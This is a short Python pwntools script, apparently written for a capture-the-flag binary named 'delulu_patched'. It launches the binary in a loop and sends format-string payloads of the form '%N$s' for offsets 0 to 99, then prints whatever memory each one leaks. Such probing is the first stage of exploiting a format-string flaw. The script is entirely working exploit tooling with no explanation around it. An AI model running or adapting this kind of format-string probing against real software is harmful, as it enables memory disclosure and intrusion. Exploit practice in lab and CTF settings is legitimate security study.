from pwn import *

elf = context.binary = ELF("./delulu_patched", checksec=False)

for i in range(100):
    try:
        p = process(level="error")
        p.sendlineafter(b">> ", "%{}$s".format(i).encode())
        result = p.recvuntil(b"[-]", drop=True)
        result = result.strip().split()[2]
        print(str(i) + ": " + str(result))
        p.close()
    except EOFError:
        pass
